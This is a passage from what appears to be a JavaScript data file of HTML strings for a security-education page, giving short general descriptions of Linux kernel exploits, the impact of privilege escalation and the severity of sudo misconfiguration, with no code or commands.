        <p><b>Kernel Exploits:</b> Exploit vulnerabilities inside the Linux kernel itself.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may gain root privileges, bypass security controls, manipulate services, install persistence mechanisms, steal sensitive data, or fully compromise Linux servers.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Linux Sudo Misconfiguration vulnerabilities are considered extremely critical because improper privilege delegation may directly expose full administrative control.</p>
    `
},

];
